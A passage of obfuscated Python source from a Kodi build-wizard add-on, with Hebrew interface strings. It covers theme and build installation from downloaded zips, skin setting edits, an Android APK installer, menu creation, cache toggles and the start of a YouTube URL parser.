					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O ,COLOR1 ,len (OOOOOO0O000OO0OOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3774
						wiz .log ("Theme List: %s "%str (OOOOOO0O000OO0OOO ))#line:3775
						O0OO0O0000OOOOO0O =DIALOG .select (ADDONTITLE ,OOOOOO0O000OO0OOO )#line:3776
						wiz .log ("Theme install selected: %s"%O0OO0O0000OOOOO0O )#line:3777
						if not O0OO0O0000OOOOO0O ==-1 :theme =OOOOOO0O000OO0OOO [O0OO0O0000OOOOO0O ];OOOOOOO00O0O0OOO0 =True #line:3778
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3779
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3780
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3781
		else :OOOOOOO00O0O0OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0000O00O0000O0O ,wiz .checkBuild (OO0000O00O0000O0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3782
		if OOOOOOO00O0O0OOO0 :#line:3783
			OO0OO000O0O00OOO0 =wiz .checkTheme (OO0000O00O0000O0O ,theme ,'url')#line:3784
			OOO0O0O00000O00OO =OO0000O00O0000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3785
			if not wiz .workingURL (OO0OO000O0O00OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3786
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3787
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3788
			OOO000OOOOOOOO0OO =os .path .join (PACKAGES ,'%s.zip'%OOO0O0O00000O00OO )#line:3789
			try :os .remove (OOO000OOOOOOOO0OO )#line:3790
			except :pass #line:3791
			downloader .download (OO0OO000O0O00OOO0 ,OOO000OOOOOOOO0OO ,DP )#line:3792
			xbmc .sleep (1000 )#line:3793
			DP .update (0 ,"","Installing %s "%OO0000O00O0000O0O )#line:3794
			OO0OOO0OO0OO0OOOO =False #line:3795
			if url not in ["fresh","normal"]:#line:3796
				OO0OOO0OO0OO0OOOO =testTheme (OOO000OOOOOOOO0OO )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3797
				O00000OOO0OOO00OO =testGui (OOO000OOOOOOOO0OO )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3798
				if OO0OOO0OO0OO0OOOO ==True :#line:3799
					wiz .lookandFeelData ('save')#line:3800
					O0O0000O0O0O0OO00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3801
					OO0O0OOOOO00O0O00 =xbmc .getSkinDir ()#line:3802
					skinSwitch .swapSkins (O0O0000O0O0O0OO00 )#line:3804
					OOOOO00O00OOOOOOO =0 #line:3805
					xbmc .sleep (1000 )#line:3806
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO00O00OOOOOOO <150 :#line:3807
						OOOOO00O00OOOOOOO +=1 #line:3808
						xbmc .sleep (1000 )#line:3809
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3810
						wiz .ebi ('SendClick(11)')#line:3811
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3812
					xbmc .sleep (1000 )#line:3813
			OOO000OOO000OO0O0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3814
			DP .update (0 ,OOO000OOO000OO0O0 ,'','אנא המתן')#line:3815
			O0000O00OO0O0O000 ,O000OOO0000OOO00O ,O0O0000000OO0OOOO =extract .all (OOO000OOOOOOOO0OO ,HOME ,DP ,title =OOO000OOO000OO0O0 )#line:3816
			wiz .setS ('buildtheme',theme )#line:3817
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0000O00OO0O0O000 ,O000OOO0000OOO00O ))#line:3818
			DP .close ()#line:3819
			if url not in ["fresh","normal"]:#line:3820
				wiz .forceUpdate ()#line:3821
				if KODIV >=17 :wiz .kodi17Fix ()#line:3822
				if O00000OOO0OOO00OO ==True :#line:3823
					wiz .lookandFeelData ('save')#line:3824
					wiz .defaultSkin ()#line:3825
					OO0O0OOOOO00O0O00 =wiz .getS ('defaultskin')#line:3826
					skinSwitch .swapSkins (OO0O0OOOOO00O0O00 )#line:3827
					OOOOO00O00OOOOOOO =0 #line:3828
					xbmc .sleep (1000 )#line:3829
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO00O00OOOOOOO <150 :#line:3830
						OOOOO00O00OOOOOOO +=1 #line:3831
						xbmc .sleep (1000 )#line:3832
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3834
						wiz .ebi ('SendClick(11)')#line:3835
					wiz .lookandFeelData ('restore')#line:3836
				elif OO0OOO0OO0OO0OOOO ==True :#line:3837
					skinSwitch .swapSkins (OO0O0OOOOO00O0O00 )#line:3838
					OOOOO00O00OOOOOOO =0 #line:3839
					xbmc .sleep (1000 )#line:3840
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO00O00OOOOOOO <150 :#line:3841
						OOOOO00O00OOOOOOO +=1 #line:3842
						xbmc .sleep (1000 )#line:3843
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3845
						wiz .ebi ('SendClick(11)')#line:3846
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3847
					wiz .lookandFeelData ('restore')#line:3848
				else :#line:3849
					wiz .ebi ("ReloadSkin()")#line:3850
					xbmc .sleep (1000 )#line:3851
					wiz .ebi ("Container.Refresh")#line:3852
		else :#line:3853
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3854
def skin_homeselect ():#line:3858
	try :#line:3860
		OOO0O0OOO0O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3861
		OO0OOOO0O00O00OO0 =open (OOO0O0OOO0O00000O ,'r')#line:3863
		OOO000O0O00O00OO0 =OO0OOOO0O00O00OO0 .read ()#line:3864
		OO0OOOO0O00O00OO0 .close ()#line:3865
		O0O00O0O0OOO0OO0O ='<setting id="HomeS" type="string(.+?)/setting>'#line:3866
		O0OO00O0O0OO0O0OO =re .compile (O0O00O0O0OOO0OO0O ).findall (OOO000O0O00O00OO0 )[0 ]#line:3867
		OO0OOOO0O00O00OO0 =open (OOO0O0OOO0O00000O ,'w')#line:3868
		OO0OOOO0O00O00OO0 .write (OOO000O0O00O00OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%O0OO00O0O0OO0O0OO ,'<setting id="HomeS" type="string"></setting>'))#line:3869
		OO0OOOO0O00O00OO0 .close ()#line:3870
	except :#line:3871
		pass #line:3872
def skin_lower ():#line:3875
	OOO0OO0OO0O0OO0O0 =(ADDON .getSetting ("lower"))#line:3876
	if OOO0OO0OO0O0OO0O0 =='true':#line:3877
		try :#line:3880
			O0000000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3881
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'r')#line:3883
			OO000OO00000OOOO0 =O0OOO0000O00000O0 .read ()#line:3884
			O0OOO0000O00000O0 .close ()#line:3885
			O0OOOO00OO0OO00OO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3886
			OOOO00OOO00OOO0OO =re .compile (O0OOOO00OO0OO00OO ).findall (OO000OO00000OOOO0 )[0 ]#line:3887
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'w')#line:3888
			O0OOO0000O00000O0 .write (OO000OO00000OOOO0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOO00OOO00OOO0OO ,'<setting id="none_widget" type="bool">true</setting>'))#line:3889
			O0OOO0000O00000O0 .close ()#line:3890
			O0000000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3892
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'r')#line:3894
			OO000OO00000OOOO0 =O0OOO0000O00000O0 .read ()#line:3895
			O0OOO0000O00000O0 .close ()#line:3896
			O0OOOO00OO0OO00OO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3897
			OOOO00OOO00OOO0OO =re .compile (O0OOOO00OO0OO00OO ).findall (OO000OO00000OOOO0 )[0 ]#line:3898
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'w')#line:3899
			O0OOO0000O00000O0 .write (OO000OO00000OOOO0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOO00OOO00OOO0OO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3900
			O0OOO0000O00000O0 .close ()#line:3901
			O0000000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3903
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'r')#line:3905
			OO000OO00000OOOO0 =O0OOO0000O00000O0 .read ()#line:3906
			O0OOO0000O00000O0 .close ()#line:3907
			O0OOOO00OO0OO00OO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3908
			OOOO00OOO00OOO0OO =re .compile (O0OOOO00OO0OO00OO ).findall (OO000OO00000OOOO0 )[0 ]#line:3909
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'w')#line:3910
			O0OOO0000O00000O0 .write (OO000OO00000OOOO0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOO00OOO00OOO0OO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:3911
			O0OOO0000O00000O0 .close ()#line:3912
			O0000000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3916
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'r')#line:3918
			OO000OO00000OOOO0 =O0OOO0000O00000O0 .read ()#line:3919
			O0OOO0000O00000O0 .close ()#line:3920
			O0OOOO00OO0OO00OO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:3921
			OOOO00OOO00OOO0OO =re .compile (O0OOOO00OO0OO00OO ).findall (OO000OO00000OOOO0 )[0 ]#line:3922
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'w')#line:3923
			O0OOO0000O00000O0 .write (OO000OO00000OOOO0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOO00OOO00OOO0OO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:3924
			O0OOO0000O00000O0 .close ()#line:3925
			O0000000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3929
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'r')#line:3931
			OO000OO00000OOOO0 =O0OOO0000O00000O0 .read ()#line:3932
			O0OOO0000O00000O0 .close ()#line:3933
			O0OOOO00OO0OO00OO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:3934
			OOOO00OOO00OOO0OO =re .compile (O0OOOO00OO0OO00OO ).findall (OO000OO00000OOOO0 )[0 ]#line:3935
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'w')#line:3936
			O0OOO0000O00000O0 .write (OO000OO00000OOOO0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOO00OOO00OOO0OO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:3937
			O0OOO0000O00000O0 .close ()#line:3938
			O0000000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3942
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'r')#line:3944
			OO000OO00000OOOO0 =O0OOO0000O00000O0 .read ()#line:3945
			O0OOO0000O00000O0 .close ()#line:3946
			O0OOOO00OO0OO00OO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:3947
			OOOO00OOO00OOO0OO =re .compile (O0OOOO00OO0OO00OO ).findall (OO000OO00000OOOO0 )[0 ]#line:3948
			O0OOO0000O00000O0 =open (O0000000OOO000OO0 ,'w')#line:3949
			O0OOO0000O00000O0 .write (OO000OO00000OOOO0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOO00OOO00OOO0OO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:3950
			O0OOO0000O00000O0 .close ()#line:3951
		except :#line:3956
			pass #line:3957
def thirdPartyInstall (OOO0000O00O0O0O0O ,OOO0O00O000O0OO0O ):#line:3959
	if not wiz .workingURL (OOO0O00O000O0OO0O ):#line:3960
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:3961
	O000OO00O00O00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0000O00O0O0O0O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:3962
	if O000OO00O00O00O0O ==1 :#line:3963
		freshStart ('third',True )#line:3964
	wiz .clearS ('build')#line:3965
	OO000000OOO0O0OOO =OOO0000O00O0O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3966
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3967
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0000O00O0O0O0O ),'','אנא המתן')#line:3968
	OO0OOOOOO0000OO00 =os .path .join (PACKAGES ,'%s.zip'%OO000000OOO0O0OOO )#line:3969
	try :os .remove (OO0OOOOOO0000OO00 )#line:3970
	except :pass #line:3971
	downloader .download (OOO0O00O000O0OO0O ,OO0OOOOOO0000OO00 ,DP )#line:3972
	xbmc .sleep (1000 )#line:3973
	OOO0O000O000OO000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0000O00O0O0O0O )#line:3974
	DP .update (0 ,OOO0O000O000OO000 ,'','אנא המתן')#line:3975
	OO0OOO0O000OOO00O ,O0OO0OOOO0000OO00 ,O0OOOO0OOOOOO00OO =extract .all (OO0OOOOOO0000OO00 ,HOME ,DP ,title =OOO0O000O000OO000 )#line:3976
	if int (float (OO0OOO0O000OOO00O ))>0 :#line:3977
		wiz .fixmetas ()#line:3978
		wiz .lookandFeelData ('save')#line:3979
		wiz .defaultSkin ()#line:3980
		wiz .setS ('installed','true')#line:3982
		wiz .setS ('extract',str (OO0OOO0O000OOO00O ))#line:3983
		wiz .setS ('errors',str (O0OO0OOOO0000OO00 ))#line:3984
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0OOO0O000OOO00O ,O0OO0OOOO0000OO00 ))#line:3985
		try :os .remove (OO0OOOOOO0000OO00 )#line:3986
		except :pass #line:3987
		if int (float (O0OO0OOOO0000OO00 ))>0 :#line:3988
			O0OO00OO000000O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0000O00O0O0O0O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO0OOO0O000OOO00O ,'%',COLOR1 ,O0OO0OOOO0000OO00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3989
			if O0OO00OO000000O00 :#line:3990
				if isinstance (O0OO0OOOO0000OO00 ,unicode ):#line:3991
					O0OOOO0OOOOOO00OO =O0OOOO0OOOOOO00OO .encode ('utf-8')#line:3992
				wiz .TextBox (ADDONTITLE ,O0OOOO0OOOOOO00OO )#line:3993
	DP .close ()#line:3994
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3995
	if INSTALLMETHOD ==1 :O0OO0OO0000O0O0O0 =1 #line:3996
	elif INSTALLMETHOD ==2 :O0OO0OO0000O0O0O0 =0 #line:3997
	else :O0OO0OO0000O0O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:3998
	if O0OO0OO0000O0O0O0 ==1 :wiz .reloadFix ()#line:3999
	else :wiz .killxbmc (True )#line:4000
def testTheme (O0O00O000OO0OOOO0 ):#line:4002
	O0O0OOOO0000OO0OO =zipfile .ZipFile (O0O00O000OO0OOOO0 )#line:4003
	for OO0OO0OO00OO000OO in O0O0OOOO0000OO0OO .infolist ():#line:4004
		if '/settings.xml'in OO0OO0OO00OO000OO .filename :#line:4005
			return True #line:4006
	return False #line:4007
def testGui (OOOOOO0OO0000000O ):#line:4009
	OO0OOO000O0O000OO =zipfile .ZipFile (OOOOOO0OO0000000O )#line:4010
	for O000OOOO0OOOO00OO in OO0OOO000O0O000OO .infolist ():#line:4011
		if '/guisettings.xml'in O000OOOO0OOOO00OO .filename :#line:4012
			return True #line:4013
	return False #line:4014
def apkInstaller (O00O000O00OO000OO ,OO0OO00O00OO0OO00 ):#line:4016
	wiz .log (O00O000O00OO000OO )#line:4017
	wiz .log (OO0OO00O00OO0OO00 )#line:4018
	if wiz .platform ()=='android':#line:4019
		OO0O0OOOOO000000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O000O00OO000OO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4020
		if not OO0O0OOOOO000000O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4021
		OO00OO0OO0OO00OO0 =O00O000O00OO000OO #line:4022
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4023
		if not wiz .workingURL (OO0OO00O00OO0OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4024
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OO0OO0OO00OO0 ),'','אנא המתן')#line:4025
		OO00O0O0OOOOO0OOO =os .path .join (PACKAGES ,"%s.apk"%O00O000O00OO000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4026
		try :os .remove (OO00O0O0OOOOO0OOO )#line:4027
		except :pass #line:4028
		downloader .download (OO0OO00O00OO0OO00 ,OO00O0O0OOOOO0OOO ,DP )#line:4029
		xbmc .sleep (100 )#line:4030
		DP .close ()#line:4031
		notify .apkInstaller (O00O000O00OO000OO )#line:4032
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO00O0O0OOOOO0OOO +'")')#line:4033
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4034
def createMenu (O0OOO0O00OOO0OOOO ,O0OO0O0OO0O000000 ,O00OO0OO00OO000OO ):#line:4040
	if O0OOO0O00OOO0OOOO =='saveaddon':#line:4041
		OO0O00OOOO0O000OO =[]#line:4042
		O00000000OOOOO0O0 =urllib .quote_plus (O0OO0O0OO0O000000 .lower ().replace (' ',''))#line:4043
		O0O00000OOO00O0O0 =O0OO0O0OO0O000000 .replace ('Debrid','Real Debrid')#line:4044
		OOO0OOO0OOOO0O0O0 =urllib .quote_plus (O00OO0OO00OO000OO .lower ().replace (' ',''))#line:4045
		O00OO0OO00OO000OO =O00OO0OO00OO000OO .replace ('url','URL Resolver')#line:4046
		OO0O00OOOO0O000OO .append ((THEME2 %O00OO0OO00OO000OO .title (),' '))#line:4047
		OO0O00OOOO0O000OO .append ((THEME3 %'Save %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4048
		OO0O00OOOO0O000OO .append ((THEME3 %'Restore %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4049
		OO0O00OOOO0O000OO .append ((THEME3 %'Clear %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4050
	elif O0OOO0O00OOO0OOOO =='save':#line:4051
		OO0O00OOOO0O000OO =[]#line:4052
		O00000000OOOOO0O0 =urllib .quote_plus (O0OO0O0OO0O000000 .lower ().replace (' ',''))#line:4053
		O0O00000OOO00O0O0 =O0OO0O0OO0O000000 .replace ('Debrid','Real Debrid')#line:4054
		OOO0OOO0OOOO0O0O0 =urllib .quote_plus (O00OO0OO00OO000OO .lower ().replace (' ',''))#line:4055
		O00OO0OO00OO000OO =O00OO0OO00OO000OO .replace ('url','URL Resolver')#line:4056
		OO0O00OOOO0O000OO .append ((THEME2 %O00OO0OO00OO000OO .title (),' '))#line:4057
		OO0O00OOOO0O000OO .append ((THEME3 %'Register %s'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4058
		OO0O00OOOO0O000OO .append ((THEME3 %'Save %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4059
		OO0O00OOOO0O000OO .append ((THEME3 %'Restore %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4060
		OO0O00OOOO0O000OO .append ((THEME3 %'Import %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4061
		OO0O00OOOO0O000OO .append ((THEME3 %'Clear Addon %s Data'%O0O00000OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00000000OOOOO0O0 ,OOO0OOO0OOOO0O0O0 )))#line:4062
	elif O0OOO0O00OOO0OOOO =='install':#line:4063
		OO0O00OOOO0O000OO =[]#line:4064
		OOO0OOO0OOOO0O0O0 =urllib .quote_plus (O00OO0OO00OO000OO )#line:4065
		OO0O00OOOO0O000OO .append ((THEME2 %O00OO0OO00OO000OO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOO0OOO0OOOO0O0O0 )))#line:4066
		OO0O00OOOO0O000OO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOO0OOO0OOOO0O0O0 )))#line:4067
		OO0O00OOOO0O000OO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOO0OOO0OOOO0O0O0 )))#line:4068
		OO0O00OOOO0O000OO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOO0OOO0OOOO0O0O0 )))#line:4069
		OO0O00OOOO0O000OO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOO0OOO0OOOO0O0O0 )))#line:4070
	OO0O00OOOO0O000OO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4071
	return OO0O00OOOO0O000OO #line:4072
def toggleCache (OO0O0000O0O0O0O0O ):#line:4074
	OOOO00O00OO0OO0OO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4075
	OOO0O0OOOO00O0OO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4076
	if OO0O0000O0O0O0O0O in ['true','false']:#line:4077
		for OO0O0O000OOOOO0OO in OOOO00O00OO0OO0OO :#line:4078
			wiz .setS (OO0O0O000OOOOO0OO ,OO0O0000O0O0O0O0O )#line:4079
	else :#line:4080
		if not OO0O0000O0O0O0O0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4081
			try :#line:4082
				OO0O0O000OOOOO0OO =OOO0O0OOOO00O0OO0 [OOOO00O00OO0OO0OO .index (OO0O0000O0O0O0O0O )]#line:4083
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0O0O000OOOOO0OO ))#line:4084
			except :#line:4085
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O0000O0O0O0O0O ))#line:4086
		else :#line:4087
			O0O000000OOO00000 ='true'if wiz .getS (OO0O0000O0O0O0O0O )=='false'else 'false'#line:4088
			wiz .setS (OO0O0000O0O0O0O0O ,O0O000000OOO00000 )#line:4089
def playVideo (OO0OO00OO0OOOOO0O ):#line:4091
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0OO00OO0OOOOO0O )#line:4092
	if 'watch?v='in OO0OO00OO0OOOOO0O :#line:4093
		OOO00OO00000O0OOO ,O000OOO0O0000OO00 =OO0OO00OO0OOOOO0O .split ('?')#line:4094
		OO0000OO0OO0O0OO0 =O000OOO0O0000OO00 .split ('&')#line:4095
		for O0O0OOOO0O0O0OO0O in OO0000OO0OO0O0OO0 :#line:4096
			if O0O0OOOO0O0O0OO0O .startswith ('v='):#line:4097
				OO0OO00OO0OOOOO0O =O0O0OOOO0O0O0OO0O [2 :]#line:4098
				break #line:4099
			else :continue #line:4100
	elif 'embed'in OO0OO00OO0OOOOO0O or 'youtu.be'in OO0OO00OO0OOOOO0O :#line:4101
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0OO00OO0OOOOO0O )#line:4102
		OOO00OO00000O0OOO =OO0OO00OO0OOOOO0O .split ('/')#line:4103
		if len (OOO00OO00000O0OOO [-1 ])>5 :#line:4104
